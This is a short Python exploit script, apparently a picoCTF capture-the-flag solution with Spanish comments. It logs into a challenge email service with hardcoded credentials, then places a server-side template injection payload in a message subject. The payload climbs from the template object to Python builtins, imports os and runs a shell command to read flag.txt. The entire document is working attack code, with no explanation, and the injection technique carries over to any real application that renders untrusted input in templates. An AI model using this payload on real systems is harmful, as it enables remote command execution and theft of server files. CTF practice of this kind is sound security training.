import requests

url = "http://activist-birds.picoctf.net:51700"

# 1. Login
login_data = {"username": "user@ses", "password": "2f4167548ca5a3bdafc23ef1513cd9fd"}
response = requests.post(f"{url}/api/login", json=login_data)
token = response.json() 

# 2. Encabezado corregido
# FastAPI busca explícitamente el header 'token'
headers = {"token": token} 

# 3. Payload SSTI
payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"

email_data = {
    "to": "admin@ses",
    "subject": payload,
    "body": "Test payload"
}

# 4. Envío
resp_send = requests.post(f"{url}/api/send", json=email_data, headers=headers)
print(f"Respuesta del servidor: {resp_send.text}")
